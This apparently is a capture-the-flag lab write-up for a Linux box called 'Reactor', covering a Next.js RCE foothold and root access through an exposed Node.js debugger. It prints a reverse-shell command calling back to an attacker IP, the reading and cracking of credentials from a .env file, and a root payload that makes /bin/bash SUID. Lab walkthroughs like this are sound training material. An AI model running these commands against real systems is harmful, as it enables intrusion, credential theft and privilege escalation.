# Reactor

> **Difficulty:** Easy  
> **Operating System:** Linux

---

## Initial Enumeration

As always, we start with some basic enumeration.

```shell
nmap -sV -sC 10.129.36.129
```

![](images/Pasted%20image%2020260629135142.png)

We add the target to our `/etc/hosts` file and head over to the website.

![](images/Pasted%20image%2020260629142034.png)

At first glance, there isn't much to work with. However, using the **Wappalyzer** browser extension reveals something much more interesting: the application is running **Next.js 15.0.3**.

Looking into vulnerabilities affecting this version leads us to an RCE vulnerability with a publicly available PoC:

[https://github.com/nehkark/CVE-2025-55182/blob/main/poc-cve-2025-55182.py](https://github.com/nehkark/CVE-2025-55182/blob/main/poc-cve-2025-55182.py)

![](images/Pasted%20image%2020260629145432.png)

---

## Foothold

We download the PoC and run it against the application to obtain a reverse shell.

```shell
nc -lvnp 4444

python3 poc-cve-2025-55182.py -u http://reactor.htb:3000 -c "bash -c 'bash -i >& /dev/tcp/10.10.15.213/4444 0>&1'"
```

![](images/Pasted%20image%2020260629145601.png)

Foothold achieved.

As usual, we don't immediately jump into automated enumeration. We first go through the basics manually: users, groups, permissions, running services, processes, and locally listening ports.

One port in particular stands out:

**9229**

```shell
ss -tulpn
```

![](images/Pasted%20image%2020260629150324.png)

Port **9229** is commonly used by the **Node.js Inspector**, the debugging interface used to attach a debugger to a running Node.js process.

If a privileged Node.js process exposes its debugger locally, gaining access to that debugging interface can become extremely dangerous because the debugger can evaluate JavaScript inside the context of the running process.

So this is definitely something worth keeping in mind for later.

Before tunneling the port, though, getting a proper SSH session would make our lives much easier.

While continuing our enumeration, we find credentials belonging to the **engineer** user.

```shell
cd /opt/reactor-app

ls -la

cat .env
```
![](images/Pasted%20image%2020260629151152.png)

We eventually recover password hashes for both **engineer** and **admin**.

However, the admin hash isn't immediately useful because **admin isn't actually a local user on the machine**. The engineer account, on the other hand, is exactly what we need.

```shell
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt pass
```
![](images/Pasted%20image%2020260629151959.png)

After cracking engineer's hash and recovering the password, we can switch from our initial reverse shell to a proper SSH session.

Even better, we can use SSH to tunnel the internal Node.js debugging port at the same time.

```shell
ssh -L 9229:127.0.0.1:9229 engineer@reactor.htb #or engineer@10.129.36.129
```

The `-L` option creates a **local port forward**:

- Our machine listens on `127.0.0.1:9229`.
    
- SSH sends anything connecting to that port through the tunnel.
    
- The target then forwards it to its own `127.0.0.1:9229`.
    

This effectively makes the target's locally exposed debugger accessible from our own machine.

![](images/Pasted%20image%2020260629152256.png)

With a stable SSH session, we can retrieve the user flag.

```shell
cd /home

cat user.txt
```

![](images/Pasted%20image%2020260629152408.png)

---

## Privilege Escalation

Now let's return to the interesting service we discovered earlier on **port 9229**.

Since we've forwarded the port through SSH, we check whether the Node.js debugging interface is reachable locally.

```shell
ps aux | grep 9229
```

![](images/Pasted%20image%2020260629152857.png)

And sure enough, it is.

This confirms that the Node.js Inspector is our privilege escalation path.

The next step is to open Chrome's built-in debugging interface:

```
chrome://inspect
```

![](images/Pasted%20image%2020260629152607.png)

Because port **9229** has already been forwarded to our machine, Chrome can discover and attach to the remote Node.js process as if it were running locally.

And here's where the real problem comes in.

The Node.js process we're debugging is running as **root**.

A debugger isn't simply a monitoring interface.
It allows us to evaluate JavaScript directly inside the context of the attached process. 
Therefore, any code we execute through the debugger inherits the privileges of that Node.js process.

Since this one is running as root, our JavaScript is effectively running as **root** as well.

Node.js gives us access to the `child_process` module, which can be used to execute operating-system commands:

```python
require('child_process').exec('chmod +s /bin/bash')
```

then on the ssh session as enginner we do:

```shell
/bin/bash -p

cat /root/root.txt
```

![](images/Pasted%20image%2020260629153839.png)

At this point, we can execute commands on the underlying system with root privileges and retrieve the final flag.

Root achieved.

---

## Conclusion

A pretty straightforward Easy box. The foothold came from identifying the vulnerable **Next.js** version, while the interesting part was definitely the exposed **Node.js debugger** on port 9229. A good reminder to always check locally listening ports and to never expose a privileged debugging interface, even if it's only bound to localhost.

That's it, see ya!

**— 0xchnk**